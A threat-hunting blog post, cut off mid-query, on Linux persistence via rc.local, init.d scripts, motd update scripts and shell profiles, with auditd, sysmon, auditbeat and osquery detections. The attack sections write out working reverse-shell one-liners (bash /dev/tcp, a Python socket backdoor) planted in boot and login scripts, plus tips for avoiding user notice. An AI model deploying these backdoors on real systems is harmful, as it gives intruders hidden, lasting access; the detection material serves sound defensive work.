---
layout: post
title: "Hunting for Persistence in Linux (Part 4): Initialization Scripts and Shell Configuration"
mini_title: "Hunting for Persistence in Linux (Part 4): Initialization Scripts and Shell Configuration"
date: 2022-02-06
category: security
comments: true
author: "Pepe Berba"
sub_categories: [mitre, persistence, threat hunting, sysmon, auditd]
summary: How attackers create can maintain persistence by inserting scripts and executables in special locations that will run on boot or logon
description: How attackers create can maintain persistence by inserting scripts and executables in special locations that will run on boot or logon
tags: [mitre, persistence, threat hunting, sysmon, auditd]
header-img-direct: /assets/posts/20220206/0-header.jpg
toc: true
---

### Introduction

In this blogpost, we'll be discussing some scripts  that attackers can install or modify that will execute on boot or logon. This is special files outside systemd services and timers.

The topics discussed here are the following:
*   [Boot or Logon Initialization Scripts: RC Scripts](https://attack.mitre.org/techniques/T1037/004/)
*   [Boot or Logon Initialization Scripts: init.d](https://attack.mitre.org/techniques/T1037/)
*   [Boot or Logon Initialization Scripts: motd](https://attack.mitre.org/techniques/T1037/)
*   [Event Triggered Execution: Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004/)

We will give some example commands on how to implement these persistence techinques and how to create alerts using open-source solutions such as auditd, sysmon and auditbeats. 

![](/assets/posts/20220206/0-introduction.png)
_Links to the full version [\[image\]](/assets/posts/common/20220201-linux-persistence.png) [\[pdf\]](/assets/posts/common/20220201-linux-persistence.pdf)_

If you need help how to setup auditd, sysmon and/or auditbeats, you can try following the instructions in the [appendix in part 1](https://pberba.github.io/security/2021/11/22/linux-threat-hunting-for-persistence-sysmon-auditd-webshell/#appendix). 

Linux Persistence Series:
* [Hunting for Persistence in Linux (Part 1): Auditing, Logging and Webshells](/security/2021/11/22/linux-threat-hunting-for-persistence-sysmon-auditd-webshell/)
    *   1 - Server Software Component: Web Shell
* [Hunting for Persistence in Linux (Part 2): Account Creation and Manipulation](/security/2021/11/23/linux-threat-hunting-for-persistence-account-creation-manipulation/#introduction)
    *   2 - Create Account: Local Account
    *   3 - Valid Accounts: Local Accounts
    *   4 - Account Manipulation: SSH Authorized Keys
* [Hunting for Persistence in Linux (Part 3): Systemd, Timers, and Cron](/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/)
    *   5 - Create or Modify System Process: Systemd Service
    *   6 - Scheduled Task/Job: Systemd Timers
    *   7 - Scheduled Task/Job: Cron
* [Hunting for Persistence in Linux (Part 4): Initialization Scripts and Shell Configuration](/security/2022/02/06/linux-threat-hunting-for-persistence-initialization-scripts-and-shell-configuration/)
    *   8 - Boot or Logon Initialization Scripts: RC Scripts
    *   9 - Boot or Logon Initialization Scripts: init.d
    *   10 - Boot or Logon Initialization Scripts: motd
    *   11 - Event Triggered Execution: Unix Shell Configuration Modification
*  (WIP) Hunting for Persistence in Linux (Part 5): Systemd Generators  
    *    Boot or Logon Initialization Scripts: systemd-generators
*  (WIP) Hunting for Persistence in Linux (Part 6): Rootkits, Compromised Software, and Others
    *   Modify Authentication Process: Pluggable Authentication Modules
    *   Compromise Client Software Binary
    *   Boot or Logon Autostart Execution: Kernel Modules and Extensions
    *   Hijack Execution Flow: Dynamic Linker Hijacking


### 8 Boot or Logon Initialization Scripts: RC Scripts

**MITRE:** [https://attack.mitre.org/techniques/T1037/004/](https://attack.mitre.org/techniques/T1037/004/)

#### 8.1 Isn't rc.local deprecated?

You might have noticed that newer version of linux distributions no longer have `/etc/rc.local`. This is because they have migrated to using `systemd` for init scripts.

However, there exists compatibility exes in `systemd` called `systemd-generator`. For example we have the [systemd-rc-local-generator](https://www.freedesktop.org/software/systemd/man/systemd-rc-local-generator.html). The exectuable for this can be found in `/usr/lib/systemd/system-generators/systemd-rc-local-generator`  ([source code](https://github.com/systemd/systemd/blob/main/src/rc-local-generator/rc-local-generator.c))

>  `systemd-rc-local-generator` is a generator that checks whether `/etc/rc.local` exists and is executable, and if it is, pulls the `rc-local.service` unit into the boot process.

As long as `systemd-rc-local-generator` is included in the current version of `systemd`, then `/etc/rc.local` will run on boot.

#### 8.2 Creating rc.local 

This is pretty straightforward, just create an executable script 

```
cat > /etc/rc.local << EOF
#! /bin/bash
echo "Success! \$(date)" >> /tmp/rc.local.out
bash -i >& /dev/tcp/127.0.0.1/7777 0>&1
EOF

chmod +x /etc/rc.local
```

On the next boot, the generator will create a symlink of `rc-local.service` in a `multi-user.target.wants` to enable and so that `/etc/rc.local` will execute. 

You can see the location of the unit file by running `systemctl status rc-local` and the unit file is `lib/systemd/system/rc-local.service` 
```
[Unit]
Description=/etc/rc.local Compatibility
Documentation=man:systemd-rc-local-generator(8)
ConditionFileIsExecutable=/etc/rc.local
After=network.target

[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
RemainAfterExit=yes
GuessMainPID=no
```

The symlink can be found in the transient directory `/run/systemd/generator/multi-user.target.wants/rc-local.service`

#### 8.3 Signs of rc-local execution

The existence of  `lib/systemd/system/rc-local.service`  **is not** evidence that `/etc/rc.local` was run. The unit file may exist on fresh installs of linux depending on the distribution (Debian 10 and Ubuntu 20). 

Aside from the existence of `/etc/rc.local`, because it is a systemd service, there will be `systemd` logs in `syslog` 

```
$ cat /var/log/syslog | egrep "rc-local.service|/etc/rc.local Compatibility"
...
Feb  1 13:27:10 persistence-vm systemd[1]: Starting /etc/rc.local Compatibility...
Feb  1 13:27:10 persistence-vm systemd[1]: Started /etc/rc.local Compatibility.
Feb  1 13:30:27 persistence-vm systemd[1]: rc-local.service: Succeeded.
Feb  1 13:30:27 persistence-vm systemd[1]: Stopped /etc/rc.local Compatibility.
```

If the VM is still running, you can look for  `/run/systemd/generator/multi-user.target.wants/rc-local.service` . This will only exist if the `systemd-rc-local-generator` found `/etc/rc.local` to an executable during boot or the last time the unit files were reloaded.

You can also check the status of the `rc-local.service` and see if it is not `incative`.

```
$ # systemctl status rc-local
● rc-local.service - /etc/rc.local Compatibility
   Loaded: loaded (/lib/systemd/system/rc-local.service; enabled-runtime; vendor preset: enabled)
  Drop-In: /usr/lib/systemd/system/rc-local.service.d
           └─debian.conf
   Active: active (exited) since Tue 2022-02-01 13:37:53 UTC; 5min ago
     Docs: man:systemd-rc-local-generator(8)
```

Here is an example when it did not run.

```
$ systemctl status rc.local
● rc-local.service - /etc/rc.local Compatibility
   Loaded: loaded (/lib/systemd/system/rc-local.service; static; vendor preset: enabled)
  Drop-In: /usr/lib/systemd/system/rc-local.service.d
           └─debian.conf
   Active: inactive (dead)
```

#### 8.3 Detecting /etc/rc.local creation

##### 8.3.1 auditd

This is **not part of our reference** Neo23x0/auditd](https://github.com/Neo23x0/auditd/blob/master/audit.rules), but we can monitor the creation or modification of `rc.local` using the following auditd rule.

```
-w /etc/rc.local -p wa -k rclocal    
```

The commands above will result in the following logs.

<pre class="highlight">
<code>SYSCALL arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55a7a1adc6e0 a2=241 a3=1b6 items=2 ppid=759 pid=819 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts1 ses=4 comm="bash" <u><b>exe="/usr/bin/bash"</b></u> subj==unconfined <b><u>key="rclocal"</u></b>
PATH item=0 name="/etc/" inode=18 dev=08:01 mode=040755 ouid=0 ogid=0 rdev=00:00 nametype=PARENT cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0
PATH item=1 <u><b>name="/etc/rc.local"</b></u> inode=4840 dev=08:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=CREATE cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0
PROCTITLE proctitle="bash"
</code></pre>


##### 8.3.2 sysmon

```xml
<FileCreate onmatch="include">
    <Rule name="TechniqueID=T1037.004,TechniqueName=Boot or Logon Initialization Scripts: RC Scripts" groupRelation="or">
        <TargetFilename condition="is">/etc/rc.local</TargetFilename>
    </Rule>
</FileCreate>
```


This results in the following log:
```xml
<?xml version="1.0"?>
<Event>
  <System>
    <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>
    <EventID>11</EventID>
    <Version>2</Version>
    <Level>4</Level>
    <Task>11</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2022-02-01T16:32:28.791576000Z"/>
    <EventRecordID>25</EventRecordID>
    <Correlation/>
    <Execution ProcessID="4617" ThreadID="4617"/>
    <Channel>Linux-Sysmon/Operational</Channel>
    <Computer>persistence-vm</Computer>
    <Security UserId="0"/>
  </System>
  <EventData>
    <Data Name="RuleName">TechniqueID=T1037.004,TechniqueName=Boot or Logon Initia</Data>
    <Data Name="UtcTime">2022-02-01 16:32:28.794</Data>
    <Data Name="ProcessGuid">{e779f71b-609c-61f9-8d97-7cde7d550000}</Data>
    <Data Name="ProcessId">4681</Data>
    <Data Name="Image">/usr/bin/bash</Data>
    <Data Name="TargetFilename">/etc/rc.local</Data>
    <Data Name="CreationUtcTime">2022-02-01 16:32:28.794</Data>
    <Data Name="User">root</Data>
  </EventData>
</Event>
```

See an example in [5.5.2 Caveats for detecting using sysmon rules](https://pberba.github.io/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/#55-detecting-using-sysmon-rules) from the previous blog post.


You can try to monitor process creation with `/etc/rc.local` however, this may not work because the `sysmon.service` is not yet running yet before the `rc-local.service` starts.

```xml
<ProcessCreate>
    <Rule name="TechniqueID=T1037.004,TechniqueName=Boot or Logon Initialization Scripts: RC Scripts" groupRelation="or">
        <CommandLine condition="contains">/etc/rc.local</CommandLine>
    </Rule>
</ProcessCreate>
```

##### 8.3.3 auditbeat

The default configuration of `auditbeat` will catch the creation of `/etc/rc.local` by the file integrity monitoring module.

![](/assets/posts/20220206/833-rclocal-auditbeat.png)

#### 8.4 Using osquery to look for rc.local

You can if the `rc-local.service` is not `inactive` using one of the following queries.

```sql
SELECT id, description,load_state, active_state, sub_state, fragment_path  
FROM systemd_units 
WHERE id = "rc-local.service" AND active_state!="inactive";
```

![](/assets/posts/20220206/84-osquery-rc-local.png)


```sql
SELECT * 
FROM startup_items 
WHERE 
    name = "rc-local.service"
    AND status != "inactive";
```

![](/assets/posts/20220206/84-osquery-startup.png)

If you are using `rc.local` then we can compare the hash instead

```sql
SELECT path, md5 FROM hash WHERE path="/etc/rc.local";
```


### 9 Boot or Logon Initialization Scripts: init.d

**MITRE:** [https://attack.mitre.org/techniques/T1037/](https://attack.mitre.org/techniques/T1037/)

#### 9.1 How does init.d and systemd work?

The `/etc/init.d/` comes from the `sysvinit` which was the traditional `init` used by linux distros such as `ubuntu` and `debian`. However, with the migration to `systemd`, scripts that normally need to be implemented in `/etc/init.d/` can now be implemented with systemd services and the `/etc/init.d/` is kept there for compatibility.

So are `/etc/init.d/` still run? It depends. The [systemd-sysv-generator](https://www.freedesktop.org/software/systemd/man/systemd-sysv-generator.html) ([source](https://github.com/systemd/systemd/blob/main/src/sysv-generator/sysv-generator.c)) creates wrapper `*.service` units at boot which will be used to run the init scripts if no `*.service` exists.

#### 9.2 Installing malicious init.d script

First create a executable script int `/etc/init.d`. Let's say that we want to make `/etc/init.d/bad-init-d` where `/opt/backdoor.sh` is our malicious script. 

One example of malicious script can be

```bash
cat > /opt/backdoor.sh << EOF
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' & disown
EOF
chmod +x /opt/backdoor.sh
```

```bash
cat > /etc/init.d/bad-init-d << EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          bad-init-d
# Required-Start:    $local_fs $network $syslog
# Required-Stop:     $local_fs $network $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
### END INIT INFO

do_start()
{
    start-stop-daemon --start \
        --pidfile /var/run/init-daemon.pid  \
        --exec /opt/backdoor.sh \
        || return 2
}


case "$1" in
  start)
        do_start
    ;;
esac
EOF

chmod +x /etc/init.d/bad-init-d    
update-rc.d bad-init-d defaults
```

The contents of `BEGIN INIT INFO` comment is necessary and is parsed by `systemd-sysv-generator` to create the wrapper service files.

The `update-rc.` command creates symlinks on necessary `/etc/rc*/` based on the LSB header defined in `BEGIN INIT INFO`. This is equivalent to `enable` in `systemd`. This is enough for the script to run on boot. 


#### 9.3 Detecting creation of /etc/init.d/scripts

The primary way we can detect this is by monitoring the modification of `/etc/init.d/*` directory. We can try to monitor process creation that use these scripts but these boot init scripts will run **before the `sysmon`, `auditd`, and `auditbeat` services has started.** 

###### 9.3.1 auditd

This rule is present in our reference [Neo23x0/auditd](https://github.com/Neo23x0/auditd/blob/master/audit.rules).

```
-w /etc/init.d/ -p wa -k init
```

This wil results in the following log

<pre class="highlight">
<code>SYSCALL arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55862848dda0 a2=241 a3=1b6 items=2 ppid=692 pid=2917 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=5 comm="bash" exe="/usr/bin/bash" subj==unconfined <b><u>key="init"</u></b>
PATH item=0 name="/etc/init.d/" inode=120 dev=08:01 mode=040755 ouid=0 ogid=0 rdev=00:00 nametype=PARENT cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0
PATH item=1 <b><u>name="/etc/init.d/bad-init-d"</u></b> inode=4842 dev=08:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=CREATE cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0
PROCTITLE proctitle="bash"
</code></pre>

##### 9.3.2 sysmon

We can see that this is implemented in [T1037_BootLogonInitScripts_CommonDirectories.xml](https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/attack-based/persistence/T1037_BootLogonInitScripts_CommonDirectories.xml)

```xml
<FileCreate onmatch="include">
    <Rule name="TechniqueID=T1037,TechniqueName=Boot or Logon Initialization Scripts" groupRelation="or">
        <TargetFilename condition="begin with">/etc/init/</TargetFilename>
        <TargetFilename condition="begin with">/etc/init.d/</TargetFilename>
        <TargetFilename condition="begin with">/etc/rc.d/</TargetFilename>
    </Rule>
</FileCreate>
```

This will result in the following log

```xml
<?xml version="1.0"?>
<Event>
  <System>
    <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>
    <EventID>11</EventID>
    <Version>2</Version>
    <Level>4</Level>
    <Task>11</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2022-02-02T03:31:07.762467000Z"/>
    <EventRecordID>6</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2887" ThreadID="2887"/>
    <Channel>Linux-Sysmon/Operational</Channel>
    <Computer>persistence-blog</Computer>
    <Security UserId="0"/>
  </System>
  <EventData>
    <Data Name="RuleName">TechniqueID=T1037,TechniqueName=Boot or </Data>
    <Data Name="UtcTime">2022-02-02 03:31:07.765</Data>
    <Data Name="ProcessGuid">{8491267f-fafb-61f9-8da7-192786550000}</Data>
    <Data Name="ProcessId">2917</Data>
    <Data Name="Image">/usr/bin/bash</Data>
    <Data Name="TargetFilename">/etc/init.d/bad-init-d</Data>
    <Data Name="CreationUtcTime">2022-02-02 03:31:07.765</Data>
    <Data Name="User">root</Data>
  </EventData>
</Event>
```

##### 9.3.3 auditbeat 

Similar to the discussion we had in the the previous [blogpost regarding systemd services](https://pberba.github.io/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/#56-detecting-using-auditbeats), the [default configuration](https://www.elastic.co/guide/en/beats/auditbeat/6.8/auditbeat-module-file_integrity.html) of `auditbeat` will monitor `/etc/init.d` in it's file integrity monitoring module.


Either set `recursive: true` or add `/etc/init.d`

```yaml
- module: file_integrity
  paths:
  - /bin
  - /usr/bin
  - /sbin
  - /usr/sbin
  - /etc
  - /etc/init.d
  # recursive: true
```

Once this is setup, we should see logs like this:

![](/assets/posts/20220206/933-auditbeat-initd.png)

##### 9.3.4 sysmon

Assuming the attacker forgot to tamper with timestamps, we can look for the most recently newly modified files `/etc/init.d`

```sql
SELECT path, filename, md5, size, atime, mtime, ctime 
FROM file 
JOIN hash 
USING(path) 
WHERE path LIKE "/etc/init.d/%" 
ORDER BY mtime DESC;
```

![](/assets/posts/20220206/94-osquery-new-files.png)



#### 9.4 Looking for evidence of `/etc/init.d/` execution

Similar to the `rc.local`, simple evidences of the  execution of `/etc/init.d` scripts are:
- to see if there are evidence of the generated `*.service` files
- check logs whether these services executed

##### 9.4.1 init scripts with description

If the LSB header of the script has a description, this will be added to the service file and a prefix of `LSB: ` is included

```
#!/bin/sh
### BEGIN INIT INFO
# Provides:          bad-init-d
# Required-Start:    $local_fs $network $syslog
# Required-Stop:     $local_fs $network $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description: Bad
### END INIT INFO
```

This will results to logs in syslog containing this description and "LSB"

```bash
$ cat /var/log/syslog | grep LSB
...
Feb  2 03:08:05 host systemd[1]: Starting LSB: Bad...
Feb  2 03:08:05 host systemd[1]: Started LSB: Bad.
Feb  2 03:16:47 host systemd[1]: Stopping LSB: Bad...
```

But this description is not required.

##### 9.4.2 Looking at generated service files

The generated files will exist in the `/var/run/systemd/generator.late/` look for `.service` files there and you can the status of the services.

```bash
$ ls /var/run/systemd/generator.late/
bad-init-d.service  graphical.target.wants  multi-user.target.wants
$ /home/user# systemctl status bad-init-d
● bad-init-d.service
   Loaded: loaded (/etc/init.d/bad-init-d; generated)
   Active: active (exited) since Wed 2022-02-02 03:58:30 UTC; 4min 28s ago
     Docs: man:systemd-sysv-generator(8)
    Tasks: 0 (limit: 4651)
   Memory: 0B
   CGroup: /system.slice/bad-init-d.service

Feb 02 03:58:30 host systemd[1]: Starting bad-init-d.service...
Feb 02 03:58:30 host systemd[1]: Started bad-init-d.service.
```

Similarly, you can list all services tagged generated by `systemd` and start your hunting there.

```
$ systemctl list-unit-files | grep generated
-.mount                                generated      
boot-efi.mount                         generated      
bad-init-d.service                     generated      
systemd-growfs@-.service               generated   
```

##### 9.4.3 Using osquery

This looks for any service files that were generated from `/etc/init.d`
```sql
SELECT id, description, load_state, active_state, sub_state,  source_path 
FROM systemd_units 
WHERE source_path LIKE "/etc/init.d%";
```

![](/assets/posts/20220206/94-osquery-initd.png)


### 10 Boot or Logon Initialization Scripts: motd

**MITRE:** [https://attack.mitre.org/techniques/T1037/](https://attack.mitre.org/techniques/T1037/)

This particular subtechnique is not part of the MITRE ATT&CK matrix. This is something I first encountered while solving `PersistenceIsFutile` in `hackthebox` and I felt this was interesting enough to discuss here.

#### 10.1 What is motd?

The `motd` or the "message of the day" is the text a user experience when logging in a linux box over ssh or a local console.

```bash
$ ssh user@1.2.3.4
Linux persistence-blog 4.19.0-18-cloud-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

...
```

The docs for this can be found in [debian's motd page](https://wiki.debian.org/motd).

For debian and ubuntu, part of this message can be generated dynamically from scripts in `/etc/update-motd.d`. This can be either triggered by `sshd` and `pam_motd`.

In `sshd`, there is a config in `/etc/ssh/sshd_config` , `PrintMotd` and this is set to `no` by default because we let `pam_motd` handle `motd`.

In `pam_motd`, this is either in `/etc/pam.d/login` or `/etc/pam.d/sshd` in the following configs

```
# This runs the /etc/update-motd.d/*
session    optional     pam_motd.so  motd=/run/motd.dynamic

# This prints out the static motd 
session    optional     pam_motd.so noupdate
```

What is interesting is that these scripts run as root regardless of which user is used to log in and it occurs each time someone connects over ssh. 

To get some idea some of the usual uses of this, we can look at scripts that come with `ubuntu`
- `00-header`     
- `91-release-upgrade`
- `90-updates-available`
- `98-reboot-required`



#### 10.2 Creating malicious scripts in motd

This is pretty straightforward. We can modify an existing script or add our own in `/etc/update-motd.d`.

For example, if `90-updates-available` exists we can add

```bash
echo '/bin/bash -l > /dev/tcp/127.0.0.1/1337 0<&1 2>&1 &' >>  /etc/update-motd.d/90-updates-available
```

Similarly, if doesn't exist, we can drop our own script.

```bash
cat > /usr/lib/update-notifier/update-motd-updates-available  << EOF
#! /bin/bash
/bin/bash -l > /dev/tcp/127.0.0.1/1337 0<&1 2>&1 &
EOF
chmod +x /usr/lib/update-notifier/update-motd-updates-available

cat > /etc/update-motd.d/90-updates-available << EOF
#!/bin/sh
if [ -x /usr/lib/update-notifier/update-motd-updates-available ]; then
    exec /usr/lib/update-notifier/update-motd-updates-available
fi
EOF
chmod +x /etc/update-motd.d/90-updates-available 
````

#### 10.3 Detecting changes in `/etc/update-motd.d`

We won't go dwell on this too much since this is very similar to the `/etc/init.d`

##### 10.3.1 auditd

This is not present in our reference [Neo23x0/auditd](https://github.com/Neo23x0/auditd/blob/master/audit.rules).

```
-w /etc/update-motd.d/ -p wa -k motd
```

##### 10.3.2 sysmon


This is not implemented in [microsoft/MSTIC-Sysmon](https://github.com/microsoft/MSTIC-Sysmon/tree/main/linux)

```xml
<FileCreate onmatch="include">
    <Rule name="TechniqueID=T1037,TechniqueName=Boot or Logon Initialization Scripts: motd" groupRelation="or">
        <TargetFilename condition="begin with">/etc/update-motd.d/</TargetFilename>
    </Rule>
</FileCreate>
```
##### 10.3.3 osquery

```sql
SELECT path, filename, md5, size, atime, mtime, ctime 
FROM file JOIN hash USING(path) 
WHERE path LIKE "/etc/update-motd.d/%" 
ORDER BY mtime DESC
```

##### 10.3.4 auditbeat

Similar to `init.d`, the `update-motd.d` is not monitored by default by auditbeats. Either set `recursive: true` or add `/etc/update-motd.d`

```yaml
- module: file_integrity
  paths:
    ...
  - /etc/update-motd.d
  # recursive: true
```


#### 10.4 Looking for suspicious processes 

Let's take time to discuss some notes when looking at running processes.

For example, if we have a reverse shell in one of the services such as `rc.local` or any other service, we can get one of two outcomes

After running `ps -auxwf` you can see the processes and their parent-child relationship.

One outcome is
![](/assets/posts/20220206/1040-process-tree.png)


Where `bash -i` has parent PID of `/bin/bash /etc/rc.local start`

Or you can also get just the case where the parent PID is `1` which is simply
![](/assets/posts/20220206/1041-process.png)


A process can have a parent ID of `1` when the parent process ends without waiting for the child to finish. For example, if you run a python script in the background you might get something like
![](/assets/posts/20220206/1042-sshd-processes.png)

But if the `bash` terminal of the user ends while `python3 malicious.py` runs in the background, then the next you check the process it `python3 malicious.py` will have a parent PID of `1`. You can list the process 
![](/assets/posts/20220206/1043-ps-grep.png)

Where we see the PPID is `689` when previously it was `686`, that is because the shell that created the background process has ended.
![](/assets/posts/20220206/1044-mal-python.png)

Since scripts in `update-motd.d` have to end for the SSH shell to start, then any long running processes that from running a malicious script in `/etc/update-motd.d` would have a parent PID of `1`. Similarly, as you can see, shell processes resulting from sshd will not have a PPID of `1`.

Some when hunting, you can start looking for `bash`, `sh` and `python` processes that you have PID 1 or those you cannot trace back to the `sshd`.

Again, in the terminal you can search for this in 
```
ps -auxwf
ps -efj | egrep "python|bash|\bsh\b|PPID"
```

Using osquery you can look for it in

```sql
SELECT pid, name, cmdline, parent
FROM processes
WHERE 
    parent = 1 
    AND regex_match(cmdline, "python|bash|\bsh\b", 0) IS NOT NULL;
```

![](/assets/posts/20220206/10-osquery-pid-1.png)

### 11 Event Triggered Execution: Unix Shell Configuration Modification

**MITRE:** [https://attack.mitre.org/techniques/T1546/004/](https://attack.mitre.org/techniques/T1546/004/)

#### 11.1 Unix Shell Configurations

Unix Shells have several configuration scripts that are execute when a shell starts or ends.

The relevant files are listed in ["FILES" section in the bash man page](https://manpages.debian.org/stretch/bash/bash.1.en.html#FILES)

| File                                       | Description                                                             |  
|:-------------------------------------------|:------------------------------------------------------------------------|
| /etc/profile                               | Systemwide files executed at the start of login shells                  |
| /etc/profile.d/                            | All .sh files are executed at the start of login shells                 |
| /etc/bash.bashrc                           | Systemwide files executed at the start of interactive shells            |
| /etc/bash.bash_logout                      | Systemwide executed as a login shell exits                              |
| ~/.bashrc                                  | User-specific startup script executed at the start of interactive shells|
| ~/.bash_profile, ~/.bash_login, ~/.profile | User-specific startup script, but only the first file found is executed | 
| ~/.bash_logout                             | User-specific clean up script at the end of the session                 |

Some common uses of these configurations are:
- Setting up the PATH variable
- Assigning aliases for commands Example: `ll='ls -alF'`
- Setting up shell's UX
- Setting up base functions

Note: The documentation and man page say that it is `/etc/bash.bash.logout` but my testing show that it is actually `/etc/bash.bash_logout`. [See thread](https://lists.gnu.org/archive/html/bug-bash/2016-08/msg00054.html)

#### 11.2 Modifying shell configuration

This is pretty straightforward, you can just add addition bash commands in one of the files listed above. However, there are some things you should watch out for. Prioritize adding to `~/.bashrc`, `~/.profile`, `/etc/profile`, or `/etc/bash.bashrc`


To debug, let's run the following and see what is triggered
```bash
# As user 
echo "echo '~/.bash_logout' >> /tmp/triggered" >> ~/.bash_logout
echo "echo '~/.bashrc' >> /tmp/triggered" >> ~/.bashrc 
echo "echo '~/.bash_profile' >> /tmp/triggered" >> ~/.bash_profile
echo "echo '~/.bash_login' >> /tmp/triggered" >> ~/.bash_login
echo "echo '~/.profile' >> /tmp/triggered" >> ~/.profile

touch /tmp/triggered

# As root
echo "echo '/etc/bash.bashrc' >> /tmp/triggered" >> /etc/bash.bashrc
echo "echo '/etc/bash.bash_logout' >> /tmp/triggered" >> /etc/bash.bash_logout
echo "echo '/etc/profile' >> /tmp/triggered" >>  /etc/profile 
echo "echo '/etc/profile.d/bad.sh' >> /tmp/triggered" > /etc/profile.d/bad.sh
```

If you get another terminal and ssh into the machine, `/etc/triggered` will have the following
```
/etc/bash.bashrc
/etc/profile.d/bad.sh
/etc/profile
~/.bash_profile
#After you end the session
~/.bash_logout
/etc/bash.bash_logout
```

So the question here is: _why was `~/.bashrc` not triggered?_

`~/.bashrc` is triggered directly when an interactive shell is created, for example, running `bash -i`. However, by convention, `~/.profile` and `/etc/profile` sources from `~/.bashrc` and `/etc/bash.bashrc` respectively.

In `~/.profile` you might see something like
```bash
# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
    . "$HOME/.bashrc"
    fi
fi
```

And in `/etc/profile`
```bash
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
```

But because we added `~/.bash_profile`, `~/.profile` is ignored and as a consequence, `~/.bashrc` is never called.  So when adding persistence using this, if `~/.profile` exists modify it instead of creating `~/.bash_profile` or `~/.bash_login` since this might break some of the configurations that have been put by the user in `~/.profile` or `~/.ssh` like `PATH` or the terminal colors. This will tip them off that something is wrong the next time they SSH into the VM.

So roll it back, we should use `~/.profile`
```bash
rm ~/.bash_login
rm ~/.bash_profile
# rm /tmp/triggered 
```

Create a new shell again using SSH 
```
/etc/bash.bashrc
/etc/profile.d/bad.sh
/etc/profile
~/.bashrc
~/.profile
 #After you end the session
~/.bash_logout
/etc/bash.bash_logout
```

#### 11.3 Watching for modifications of shell configurations

##### 11.3.1 auditd

These are the rules from reference [Neo23x0/auditd](https://github.com/Neo23x0/auditd/blob/master/audit.rules) that are relevant here. This also includes other configs for other shells.

```
## Shell/profile configurations
-w /etc/profile.d/ -p wa -k shell_profiles
-w /etc/profile -p wa -k shell_profiles
-w /etc/shells -p wa -k shell_profiles
-w /etc/bashrc -p wa -k shell_profiles
-w /etc/csh.cshrc -p wa -k shell_profiles
-w /etc/csh.login -p wa -k shell_profiles
-w /etc/fish/ -p wa -k shell_profiles
-w /etc/zsh/ -p wa -k shell_profiles
```

I'm not sure for other distros, but there might be a typo here

```
# -w /etc/bashrc -p wa -k shell_profiles
-w /etc/bash.bashrc -p wa -k shell_profiles
```

I recommend adding `bash_logout` scripts

```
-w /etc/bash.bash_logout -p wa -k shell_profiles
```

Additionally, for known users try to monitor the user specific config

```
-w /root/.profile -p wa -k shell_profiles
-w /root/.bashrc -p wa -k shell_profiles
-w /root/.bash_logout -p wa -k shell_profiles
-w /root/.bash_profile -p wa -k shell_profiles
-w /root/.bash_login -p wa -k shell_profiles
```

##### 11.3.2 sysmon

```xml
<FileCreate onmatch="include">
    <Rule name="TechniqueID=T1546.004,TechniqueName=Event Triggered Execution: Unix Shell Configuration Modification" groupRelation="or">
        <TargetFilename condition="begin with">/etc/profile.d/</TargetFilename>
        <TargetFilename condition="is">/etc/profile</TargetFilename>
        <TargetFilename condition="is">/etc/bash.bashrc</TargetFilename>
        <TargetFilename condition="is">/etc/bash.bash_logout</TargetFilename>
        <TargetFilename condition="end with">.bashrc</TargetFilename>
        <TargetFilename condition="end with">.bash_profile</TargetFilename>
        <TargetFilename condition="end with">.bash_login</TargetFilename>
        <TargetFilename condition="end with">.profile</TargetFilename>
        <TargetFilename condition="end with">.bash_logout</TargetFilename>
    </Rule>
</FileCreate>
```

Unfortunately, this won't detect the modification of existing files such as `/etc/profile`, `/etc/bash.bashrc`, `/root/.bashrc`, or `/root/.profile`. So until sysmon is able to have a file modification event, prefer to use `auditd` or other file integrity monitoring tool.

##### 11.3.3 auditbeat

By default, auditbeat will be able to monitor `/etc/profile`, `/etc/bash.bashrc`, and `/etc/bash.bash_logout`. Similar to `init.d`, it won't monitors subdirectories by default so we have to include `/etc/profile.d`

```yaml
- module: file_integrity
  paths:
    ...
  - /etc/profile.d
  # - /root/
  # - /home/user/
  # recursive: true
```

It's not as easy to monitor the user specific configs. We can add their home directories, but depending on your setup, these locations might ahve files that are modified frequeuntly.


##### 11.3.4 osquery

Sorry this is a chunky query, but what it does is it looks for system wide shell profiles as well as enumerate possible user configurations based on the home directory of each user in the machine.

This allows you to get snapshots of the shell profiles.

```sql
WITH system_wide AS (
